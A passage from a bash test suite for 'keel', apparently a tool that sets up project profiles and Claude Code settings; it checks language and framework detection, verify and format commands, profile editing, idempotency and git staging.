# by sourcing the library, because bin/keel scaffolds package.json before it primes and so cannot
# reach this ordering today; one reordered line in cmd_new would.
d="$(mktemp -d)"
cat > "$d/probe.sh" <<'P'
have_python() { command -v python3 >/dev/null 2>&1; }
. "$1"
pkg_scripts_load
printf '{"name":"f","scripts":{"test":"jest"}}\n' > package.json
pkg_script test
P
got="$( cd "$d" && bash probe.sh "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "$got" = "jest" ] \
  && ok "a package.json written after the cache was primed is still read" \
  || bad "pkg_scripts_load" "pkg_script returned '$got'; the load was marked done against a missing package.json"
rm -rf "$d"

# ---- interpreter starts ----------------------------------------------------
# One interpreter start per npm script lookup, and detect_verify looks up to three times for each
# of ten verify keys. On a node project that was seventeen of init's twenty-four python3 starts,
# reading one small file seventeen times. The bound is asserted rather than the saving, because a
# saving in seconds is a property of the machine and a spawn count is a property of the code.
d="$(fixture node-ts)"
shimdir="$(mktemp -d)"
real_python="$(command -v python3)"
cat > "$shimdir/python3" <<SHIM
#!/bin/sh
printf 'x\n' >> "$shimdir/count"
exec "$real_python" "\$@"
SHIM
chmod +x "$shimdir/python3"
: > "$shimdir/count"
( cd "$d" && PATH="$shimdir:$PATH" "$KEEL" init >/dev/null 2>&1 )
spawns="$(grep -c x "$shimdir/count" 2>/dev/null || true)"
# The lower bound is not decoration: `grep -c` prints 0 on an empty count file, so a $KEEL that
# dies before it reaches an interpreter would otherwise report PASS. The suite already requires
# python3, so a real run cannot be at zero.
[ "${spawns:-99}" -ge 1 ] && [ "${spawns:-99}" -le 10 ] \
  && ok "keel init starts python3 at most 10 times ($spawns)" \
  || bad "interpreter starts" "keel init started python3 $spawns times on a node fixture. pkg_script and json_get are meant to read their file once each, not once per value"
rm -rf "$d" "$shimdir"

# Thirteen of doctor's nineteen interpreter starts were json_get reading one dotted path each from
# the same small file.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init >/dev/null 2>&1 )
shimdir="$(mktemp -d)"
real_python="$(command -v python3)"
cat > "$shimdir/python3" <<SHIM
#!/bin/sh
printf 'x\n' >> "$shimdir/count"
exec "$real_python" "\$@"
SHIM
chmod +x "$shimdir/python3"
: > "$shimdir/count"
( cd "$d" && PATH="$shimdir:$PATH" "$KEEL" doctor >/dev/null 2>&1 )
spawns="$(grep -c x "$shimdir/count" 2>/dev/null || true)"
[ "${spawns:-99}" -ge 1 ] && [ "${spawns:-99}" -le 10 ] \
  && ok "keel doctor starts python3 at most 10 times ($spawns)" \
  || bad "interpreter starts" "keel doctor started python3 $spawns times. json_get is meant to read the profile once, not once per field"
rm -rf "$d" "$shimdir"

# The absent/null distinction json_get's callers depend on. A cache that cannot tell them apart
# sends `project.kind` to its 'service' default on a profile that says 'docs'.
#
# test_integration, not build: the node-ts fixture declares a build script, so verify.build is set
# and would not test the null path at all.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile get verify.test_integration >/dev/null 2>&1 ) \
  && ok "a null field reads as present and empty" \
  || bad "json_get contract" "verify.test_integration is null in the profile, and 'profile get' treated it as absent"
( cd "$d" && "$KEEL" profile get verify.nosuchfield >/dev/null 2>&1 ) \
  && bad "json_get contract" "verify.nosuchfield does not exist, and 'profile get' treated it as present" \
  || ok "an absent field is refused"
rm -rf "$d"

# The flattener joins segments with a dot, so `{"a.b": 1}` and `{"a":{"b":1}}` are the same cache
# line. `profile set` walks the real structure and refuses the first, and a `get` that accepts what
# `set` refuses is worse than one that refuses both.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init >/dev/null 2>&1 )
python3 -c "import json;p='$d/.keel/profile.json';j=json.load(open(p));j['nested']={'a.b':1};json.dump(j,open(p,'w'))"
( cd "$d" && "$KEEL" profile get nested.a.b >/dev/null 2>&1 ) \
  && bad "json_get contract" "a literal 'a.b' key was served as the nested path nested.a.b, which 'profile set' refuses" \
  || ok "a literal dotted key is not served as a nested path"
rm -rf "$d"

# ---- python tooling --------------------------------------------------------
# pytest was written into every Python profile, declared or not. On a project that uses unittest
# `keel doctor` then fails on a command the project never had, which is the check crying wolf.
d="$(fixture python)"
v_test="$(detect_in "$d" 'detect_verify test')"
[ -z "$v_test" ] && ok "python without pytest declared gets no test command" \
  || bad "python" "test was guessed as '$v_test'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[project]\nname = "f"\ndependencies = []\n\n[dependency-groups]\ndev = ["pytest", "ruff", "pyright"]\n' > pyproject.toml
  : > uv.lock )
v_pm="$(detect_in "$d" 'detect_stack | cut -d" " -f4')"
v_test="$(detect_in "$d" 'detect_verify test')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_pm" = "uv" ] \
  && ok "a uv.lock means uv" || bad "python" "package manager was not uv"
[ "$v_test" = "uv run pytest" ] && ok "uv runs pytest inside the project environment" \
  || bad "python" "test was '$v_test'"
[ "$v_typecheck" = "uv run pyright" ] && ok "pyright is honoured as the type checker" \
  || bad "python" "typecheck was '$v_typecheck'"
[ "$v_lint" = "uv run ruff check ." ] && ok "ruff is honoured under the project runner" \
  || bad "python" "lint was '$v_lint'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'pytest\nflake8\nmypy\n' > requirements.txt
  mkdir -p tests )
v_test="$(detect_in "$d" 'detect_verify test')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_test" = "pytest" ] && ok "plain pip runs pytest with no prefix" \
  || bad "python" "test was '$v_test'"
[ "$v_lint" = "flake8" ] && ok "flake8 in requirements.txt is the lint command" \
  || bad "python" "lint was '$v_lint'"
[ "$v_typecheck" = "mypy ." ] && ok "mypy is still honoured" \
  || bad "python" "typecheck was '$v_typecheck'"
rm -rf "$d"

# A project with a tests/ directory and no pytest anywhere runs the standard library runner.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[project]\nname = "f"\n' > pyproject.toml
  mkdir -p tests && printf 'import unittest\n' > tests/test_f.py )
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "python -m unittest discover" ] && ok "a tests dir with no pytest gets unittest" \
  || bad "python" "test was '$v_test'"
rm -rf "$d"

# ---- php, go and java, from declarations rather than from the machine -------
# PHP got no test command at all unless vendor/ happened to be installed, and vendor/ is gitignored
# on essentially every PHP project, so a fresh clone always produced an empty profile.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f/f","require-dev":{"phpunit/phpunit":"^11","phpstan/phpstan":"^2"}}\n' > composer.json )
v_test="$(detect_in "$d" 'detect_verify test')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_test" = "vendor/bin/phpunit" ] && ok "phpunit in composer.json is enough, with no vendor dir" \
  || bad "php" "test was '$v_test'"
[ "$v_typecheck" = "vendor/bin/phpstan analyse" ] && ok "phpstan is the PHP type checker" \
  || bad "php" "typecheck was '$v_typecheck'"
rm -rf "$d"

# Pest is a different runner and a different binary. A project that declares it must not be told
# to run phpunit.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f/f","require-dev":{"pestphp/pest":"^3"}}\n' > composer.json )
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "vendor/bin/pest" ] && ok "a Pest project runs Pest" \
  || bad "php" "test was '$v_test'"
rm -rf "$d"

# Go's lint command depended on golangci-lint being installed on the machine running init, which
# freezes one laptop's answer into a file every teammate reads. The config file is the declaration.
d="$(fixture go)"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ -z "$v_lint" ] && ok "Go with no linter config gets no lint command" \
  || bad "go" "lint was '$v_lint', which came from this machine rather than the repo"
rm -rf "$d"

d="$(fixture go)"
printf 'linters:\n  enable: [errcheck]\n' > "$d/.golangci.yml"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_lint" = "golangci-lint run" ] && ok "a .golangci.yml is the declaration golangci-lint needs" \
  || bad "go" "lint was '$v_lint'"
rm -rf "$d"

# ---- verify commands for the languages added in this plan -------------------
# One assertion per language on the command that is not a guess, and one on a command that must
# stay null because the project declares no such tool. The null half is the half that matters:
# a profile with a wrong command fails at first use and teaches people to distrust the file.
d="$(fixture csharp)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_test" = "dotnet test" ] && ok "C# gets dotnet test" \
  || bad "verify csharp" "test was '$v_test'"
[ "$v_format" = "dotnet format --verify-no-changes" ] && ok "C# formats with the SDK formatter" \
  || bad "verify csharp" "format was '$v_format'"
rm -rf "$d"

d="$(fixture ruby)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_test" = "bundle exec rspec" ] && ok "Ruby with a spec dir gets rspec" \
  || bad "verify ruby" "test was '$v_test'"
[ -z "$v_lint" ] && ok "Ruby without rubocop declared gets no lint command" \
  || bad "verify ruby" "lint was guessed as '$v_lint'"
rm -rf "$d"

d="$(fixture kotlin)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_test" = "./gradlew test" ] && ok "Kotlin gets the Gradle test task" \
  || bad "verify kotlin" "test was '$v_test'"
[ "$v_typecheck" = "./gradlew compileKotlin" ] && ok "Kotlin typechecks with compileKotlin, not compileJava" \
  || bad "verify kotlin" "typecheck was '$v_typecheck'"
rm -rf "$d"

d="$(fixture swift)"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "swift test" ] && ok "Swift gets swift test" \
  || bad "verify swift" "test was '$v_test'"
rm -rf "$d"

d="$(fixture cpp)"
v_build="$(detect_in "$d" 'detect_verify build')"
v_test="$(detect_in "$d" 'detect_verify test')"
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_build" = "cmake --build build" ] && ok "CMake gets a build command" \
  || bad "verify cpp" "build was '$v_build'"
[ "$v_test" = "ctest --test-dir build" ] && ok "a CMake project that enables testing gets ctest" \
  || bad "verify cpp" "test was '$v_test'"
[ -z "$v_format" ] && ok "C++ without a .clang-format gets no format command" \
  || bad "verify cpp" "format was guessed as '$v_format'"
rm -rf "$d"

d="$(fixture lua)"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_typecheck" = "lua-language-server --check ." ] && ok "Lua with a .luarc.json gets a check command" \
  || bad "verify lua" "typecheck was '$v_typecheck'"
[ -z "$v_test" ] && ok "Lua without busted declared gets no test command" \
  || bad "verify lua" "test was guessed as '$v_test'"
rm -rf "$d"

# ---- language servers ------------------------------------------------------
# Every id asserted here is in claude-plugins-official. An id that is not real is worse than no
# suggestion: it lands in settings.json, fails to resolve, and the user distrusts the whole file.
plugins_of() {   # plugins_of <dir>
    python3 -c "import json;print(' '.join(json.load(open('$1/.claude/settings.json'))['enabledPlugins']))" 2>/dev/null
}
for pair in "csharp:csharp-lsp" "ruby:ruby-lsp" "kotlin:kotlin-lsp" "swift:swift-lsp" "cpp:clangd-lsp" "lua:lua-lsp"; do
    stack="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture "$stack")"
    ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
    case "$(plugins_of "$d")" in *"$want@claude-plugins-official"*) ok "$stack gets $want" ;;
      *) bad "lsp" "$stack got no $want: $(plugins_of "$d")" ;; esac
    rm -rf "$d"
done

# ---- polyglot repositories -------------------------------------------------
# A Python service behind a TypeScript app was described as TypeScript and nothing else, so the
# Python half got no language server and every skill reading the profile believed the repo was
# single-stack.
d="$(fixture polyglot)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(python3 -c "import json;s=json.load(open('$d/.keel/profile.json'))['stack'];print(s['language'],','.join(s['also']))" 2>/dev/null)"
[ "$got" = "typescript python" ] && ok "a polyglot repo records the second language in stack.also" \
  || bad "polyglot" "got '$got', want 'typescript python'"
case "$(plugins_of "$d")" in *pyright-lsp*) ok "the second language gets its language server too" ;;
  *) bad "polyglot" "no pyright-lsp: $(plugins_of "$d")" ;; esac
# The primary still drives the verify commands. A repo is not tested twice because it has two
# languages, and choosing which one runs is the user's call, not a detector's.
[ "$(verify_of "$d" test)" = "npm test" ] && ok "the primary language still drives verify" \
  || bad "polyglot" "test was '$(verify_of "$d" test)'"
rm -rf "$d"

# Single-stack repositories get an empty array rather than a missing key, so nothing downstream has
# to tell absent from empty.
d="$(fixture go)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(prof_of "$d" stack.also)" = "[]" ] \
  && ok "a single-stack repo gets an empty stack.also" || bad "polyglot" "stack.also is missing or not empty"
rm -rf "$d"

# ---- framework detection --------------------------------------------------
# Found by running init on a real NestJS service, which was detected as Next.js because the
# nestjs marker was OR'd into every iteration of the framework loop.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"@nestjs/core":"^10"},"scripts":{"test":"jest"}}' > package.json
  echo '{}' > tsconfig.json )
got="$(detect_in "$d" 'detect_stack | cut -d" " -f3')"
if [ "$got" = "nest" ]; then ok "a NestJS service is detected as nest"
else bad "framework" "got '$got', want 'nest'"; fi
rm -rf "$d"

# ---- has_ui ---------------------------------------------------------------
# Every profile was written with a hardcoded `has_ui: false`, so `coding-standards` never reached
# references/frontend.md on a project that had a frontend. The detector already existed in
# lib/detect-stack.sh; its answer was used to recommend plugins and then discarded.

ui_of() {  # ui_of <dir> -> the profile's stack.has_ui, printed as Python's True or False
    python3 -c "import json;print(json.load(open('$1/.keel/profile.json'))['stack']['has_ui'])" 2>/dev/null
}

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"react":"^18"},"scripts":{"test":"jest"}}' > package.json )
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(ui_of "$d")" = "True" ] && ok "a React project has has_ui true" \
  || bad "has_ui" "React project got '$(ui_of "$d")', want True"
rm -rf "$d"

# A static site is a UI with no framework and no package.json to name one.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '<!doctype html>\n' > index.html )
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "true" ] && ok "a static site has has_ui true" \
  || bad "has_ui" "static site got '$got', want true"
rm -rf "$d"

# The other direction matters as much, and this one passes before the fix: it is here to hold the
# detector to backend frameworks rather than to anything shaped like JavaScript.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"@nestjs/core":"^10"},"scripts":{"test":"jest"}}' > package.json )
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "false" ] && ok "a NestJS service has has_ui false" \
  || bad "has_ui" "NestJS service got '$got', want false"
rm -rf "$d"

# APEX pages are served from inside the database, so an APEX export has neither a local public/ nor
# an index.html for the fallback below to find. The framework name is the only signal there is.
d="$(fixture plsql)"
printf '{"apex_version":"23.2"}\n' > "$d/manifest.json"
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "true" ] && ok "an APEX export has has_ui true" \
  || bad "has_ui" "APEX export got '$got', want true"
rm -rf "$d"

# ---- datastores -----------------------------------------------------------
# The same defect has_ui had, in the field beside it: stack.datastores was written as a hardcoded
# empty list. Found on the existing-service pilot, whose repository declared postgres and redis
# twice over, in its dependencies and in its compose file, and was recorded as using neither.
# templates/keel-profile.example.json advertises exactly that pair, so the field read as detected.

stores_of() {  # stores_of <dir> -> the profile's stack.datastores, comma-separated and sorted
    python3 -c "import json;print(','.join(sorted(json.load(open('$1/.keel/profile.json'))['stack']['datastores'])))" 2>/dev/null
}

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"pg":"^8","ioredis":"^5"},"scripts":{"test":"jest"}}' > package.json )
got="$(detect_in "$d" 'detect_datastores | sort | tr "\n" " "')"
[ "$got" = "postgres redis " ] \
  && ok "client libraries in package.json are read as datastores" \
  || bad "datastores" "dependencies gave '$got', want 'postgres redis '"
rm -rf "$d"

# The second signal, and the one that is language-independent: a managed database reached over a
# connection string leaves nothing in a dependency list of a language keel does not parse, but the
# service a developer runs locally is named in the compose file.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'module f\n\ngo 1.22\n' > go.mod
  printf 'services:\n  db:\n    image: postgres:15-alpine\n  cache:\n    image: redis:7-alpine\n' \
    > docker-compose.yml )
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(stores_of "$d")" = "postgres,redis" ] \
  && ok "compose service images are read as datastores" \
  || bad "datastores" "compose file gave '$(stores_of "$d")', want postgres,redis"
rm -rf "$d"

# The other direction, as with has_ui: a project with no store must report none rather than a guess.
# `[]` is the right answer here and the wrong one above, and only this pair tells them apart.
d="$(fixture node-ts)"
got="$(detect_in "$d" 'detect_datastores | sort | tr "\n" " "')"
[ -z "$got" ] && ok "a project with no datastore reports none" \
  || bad "datastores" "a storeless project got '$got', want nothing"
rm -rf "$d"

# ---- profile ---------------------------------------------------------------

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "import json;json.load(open('$d/.keel/profile.json'))" 2>/dev/null \
  && ok "profile is valid JSON" || bad "profile JSON" "did not parse"
[ -f "$d/docs/keel/README.md" ] && ok "scaffolds the docs root" || bad "docs root" "missing"
[ -f "$d/docs/keel/prompting.md" ] && ok "installs the prompting cheatsheet" || bad "cheatsheet" "missing"
[ -f "$d/AGENTS.md" ] && ok "writes AGENTS.md for other agents" || bad "AGENTS.md" "missing"

# The rendered block must carry no unsubstituted placeholder.
grep -q '{{' "$d/CLAUDE.md" && bad "placeholders" "unsubstituted {{...}} left in CLAUDE.md" \
  || ok "every placeholder is substituted"
grep -q 'npm test' "$d/CLAUDE.md" && ok "renders the real verify command" || bad "render" "no npm test"

# ---- idempotency -----------------------------------------------------------

before="$(md5 -q "$d/CLAUDE.md" 2>/dev/null || md5sum "$d/CLAUDE.md" | cut -d' ' -f1)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
after="$(md5 -q "$d/CLAUDE.md" 2>/dev/null || md5sum "$d/CLAUDE.md" | cut -d' ' -f1)"
[ "$before" = "$after" ] && ok "re-running init is byte-identical" || bad "idempotency" "CLAUDE.md changed"
rm -rf "$d"

# ---- preserving user content ----------------------------------------------

d="$(fixture node-ts)"
printf '# My project\n\nMy own notes that must survive.\n' > "$d/CLAUDE.md"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'My own notes that must survive' "$d/CLAUDE.md" \
  && ok "existing CLAUDE.md content is preserved" || bad "preserve" "user content lost"
grep -q 'keel:start' "$d/CLAUDE.md" && ok "block is appended to an existing file" || bad "append" "no marker"
rm -rf "$d"

# ---- marker corruption is reported, not repaired --------------------------

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
cat "$d/CLAUDE.md" "$d/CLAUDE.md" > "$d/CLAUDE.md.dup" && mv "$d/CLAUDE.md.dup" "$d/CLAUDE.md"
if ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 ); then
  bad "duplicate markers" "init succeeded on a corrupted file"
else ok "duplicate markers are reported, not silently fixed"; fi
rm -rf "$d"

# ---- the gitignored docs root --------------------------------------------

d="$(fixture node-ts)"
printf 'docs/\n' > "$d/.gitignore"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
rc=$?
[ "$rc" -ne 0 ] && ok "refuses when the docs root is gitignored" \
  || bad "gitignored docs" "init proceeded silently (exit $rc)"
rm -rf "$d"

# ---- and the remedy it prints has to be one git will honour ----------------
# Found by running init on a real project whose .gitignore had a bare `docs` line. keel printed
# `!docs/keel/`, which git cannot honour: a negation never reaches inside an excluded directory, so
# following the printed advice left init refusing exactly as before. The patterns are read back out
# of the message, so this passes only while what keel prints is what actually works.

d="$(fixture node-ts)"
printf 'docs\n' > "$d/.gitignore"
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
printf '%s\n' "$out" | sed -n 's/^keel:[[:space:]]*\([^[:space:]][^[:space:]]*\)$/\1/p' >> "$d/.gitignore"
if ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 ); then
  ok "the .gitignore remedy keel prints un-ignores the docs root"
else
  bad "gitignored docs" "init still refused after applying the remedy it printed"
fi
rm -rf "$d"

# ---- an existing profile is never clobbered -------------------------------
# Found by running init on a real project: it replaced a hand-corrected test command with a
# detected one that could not run. Detection is a starting point, not an authority.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]["test"]="npm test -- --runInBand"
d["project"]["description"]="written by a human"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
case "$got" in
  *runInBand*) ok "a corrected verify command survives re-init" ;;
  *) bad "clobbering" "init overwrote a human-corrected command with '$got'" ;;
esac
got="$(prof_of "$d" project.description)"
if [ "$got" = "written by a human" ]; then ok "human-written profile fields survive re-init"
else bad "clobbering" "description was reset to '$got'"; fi
rm -rf "$d"

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]["test"]="wrong"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
( cd "$d" && "$KEEL" init -y --force >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
if [ "$got" = "npm test" ]; then ok "--force does overwrite"
else bad "--force" "got '$got'"; fi
rm -rf "$d"

# ---- keel profile get and set ---------------------------------------------
# A fact recorded at init can turn out wrong later: a project that gains a UI during design is
# the case this exists for. Re-running init cannot correct it, because merge_profile keeps the
# human side of every non-empty value, so there has to be a supported way in that is not a text
# editor pointed at JSON.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

got="$( cd "$d" && "$KEEL" profile get stack.language 2>&1 )"
[ "$got" = "typescript" ] && ok "profile get prints a value" || bad "profile get" "got '$got'"

( cd "$d" && "$KEEL" profile set stack.has_ui true >/dev/null 2>&1 )
got="$(prof_of "$d" stack.has_ui)"
[ "$got" = "True" ] && ok "profile set writes a JSON boolean, not the string 'true'" \
  || bad "profile set bool" "got '$got', want True"

( cd "$d" && "$KEEL" profile set verify.lint 'eslint . --max-warnings 0' >/dev/null 2>&1 )
got="$(prof_of "$d" verify.lint)"
[ "$got" = "eslint . --max-warnings 0" ] && ok "profile set writes a string containing spaces" \
  || bad "profile set string" "got '$got'"

( cd "$d" && "$KEEL" profile set verify.build null >/dev/null 2>&1 )
got="$(prof_of "$d" verify.build)"
[ "$got" = "None" ] && ok "profile set null clears a value" || bad "profile set null" "got '$got'"

# A typo has to fail loudly and name itself. Writing stack.hasUI beside stack.has_ui creates a key
# nothing reads, and the caller walks away believing the fact was recorded.
out="$( cd "$d" && "$KEEL" profile set stack.hasUI true 2>&1 )"
case "$out" in
  *hasUI*) ok "profile set refuses a path the profile does not have, and names it" ;;
  *)       bad "unknown path" "refusal did not name the path: '$out'" ;;
esac
python3 -c "import json,sys;sys.exit('hasUI' in json.load(open('$d/.keel/profile.json'))['stack'])" \
  && ok "the refused key was not written" || bad "unknown path" "stack.hasUI was written anyway"

# init owns this one. It records which keel wrote the profile, and doctor reads it to say the
# project is behind; a hand-set value makes that unanswerable.
out="$( cd "$d" && "$KEEL" profile set keel_version 9.9.9 2>&1 )"
case "$out" in
  *keel_version*) ok "profile set refuses keel_version, which init owns" ;;
  *)              bad "keel_version" "refusal did not name the field: '$out'" ;;
esac
got="$(prof_of "$d" keel_version)"
[ "$got" != "9.9.9" ] && ok "keel_version was left alone" || bad "keel_version" "it was rewritten"
rm -rf "$d"

# ---- formatters, and the check against write split ------------------------
# A gate needs a command that reports without rewriting, which is what verify.format now holds;
# the writing variant is verify.format_fix, so a refusal can name the remedy. Before this, format
# was detected for npm alone and every other stack carried null, which makes a format gate a
# no-op on five stacks out of seven while reading as though it were switched on.

# go and rust ship their formatter with the toolchain, so naming it is not a guess.
d="$(fixture go)"
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = 'test -z "$(gofmt -l .)"' ] \
  && ok "go gets a check-only formatter" || bad "go format" "got '$v_format'"
[ "$v_format_fix" = "gofmt -w ." ] \
  && ok "go gets the writing variant separately" || bad "go format_fix" "got '$v_format_fix'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[package]\nname = "f"\n' > Cargo.toml )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "cargo fmt --check" ] \
  && ok "rust gets a check-only formatter" || bad "rust format" "got '$v_format'"
[ "$v_format_fix" = "cargo fmt" ] \
  && ok "rust gets the writing variant separately" || bad "rust format_fix" "got '$v_format_fix'"
rm -rf "$d"

# npm is the case that motivated the split: `npm run format` rewrites, so it cannot be the gate.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","scripts":{"test":"jest","format":"prettier --write ."}}' > package.json )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ -z "$v_format" ] \
  && ok "a writing npm format script does not become the gate" || bad "npm format" "got '$v_format'"
[ "$v_format_fix" = "npm run format" ] \
  && ok "a writing npm format script becomes format_fix" || bad "npm format_fix" "got '$v_format_fix'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","scripts":{"test":"jest","format":"prettier --write .","format:check":"prettier --check ."}}' > package.json )
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_format" = "npm run format:check" ] \
  && ok "a declared format:check earns the gate slot" || bad "npm format:check" "got '$v_format'"
rm -rf "$d"

# Declared tools only for python, php and java: none of them ships a formatter with the runtime,
# so an undeclared one is a command that fails at first use.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[project]\nname = "f"\n[tool.ruff]\nline-length = 100\n' > pyproject.toml )
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_format" = "ruff format --check ." ] \
  && ok "python with ruff declared gets ruff format --check" || bad "ruff format" "got '$v_format'"
rm -rf "$d"

d="$(fixture python)"
v_format="$(detect_in "$d" 'detect_verify format')"
[ -z "$v_format" ] \
  && ok "python with no formatter declared gets null, not a guess" || bad "python format" "got '$v_format'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  echo '{"name":"f/f"}' > composer.json && mkdir -p vendor/bin && touch vendor/bin/pint )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "vendor/bin/pint --test" ] \
  && ok "php with pint installed gets pint --test" || bad "pint format" "got '$v_format'"
[ "$v_format_fix" = "vendor/bin/pint" ] \
  && ok "php gets the writing variant separately" || bad "pint format_fix" "got '$v_format_fix'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'plugins { id "com.diffplug.spotless" version "6.25.0" }\n' > build.gradle )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "./gradlew spotlessCheck" ] \
  && ok "gradle with spotless declared gets spotlessCheck" || bad "spotless format" "got '$v_format'"
[ "$v_format_fix" = "./gradlew spotlessApply" ] \
  && ok "gradle gets the writing variant separately" || bad "spotless format_fix" "got '$v_format_fix'"
rm -rf "$d"

# ---- the default branch is not the checked-out branch --------------------
d="$(fixture node-ts)"
( cd "$d" && git checkout -q -b feature-x )
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" conventions.default_branch)"
if [ "$got" = "main" ]; then ok "default_branch is the repo default, not the checked-out branch"
else bad "default_branch" "got '$got' while on feature-x"; fi
rm -rf "$d"

# ---- --team ---------------------------------------------------------------
# --team exists so a teammate's clone carries the SOP. Everything init wrote has to be staged,
# .gitignore included: it holds the rule keeping the bypassPermissions settings.local.json out of
# the repo, and unstaged, the teammate who clones commits that file.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y --team >/dev/null 2>&1 )
staged="$( cd "$d" && git diff --cached --name-only )"
for want in .keel/profile.json CLAUDE.md AGENTS.md .claude/settings.json .claude/keel-nudge \
            docs/keel/README.md .gitignore; do
    printf '%s\n' "$staged" | grep -qxF "$want" && ok "--team stages $want" \
      || bad "--team staging" "$want is not in the index"
done
printf '%s\n' "$staged" | grep -qxF .claude/settings.local.json \
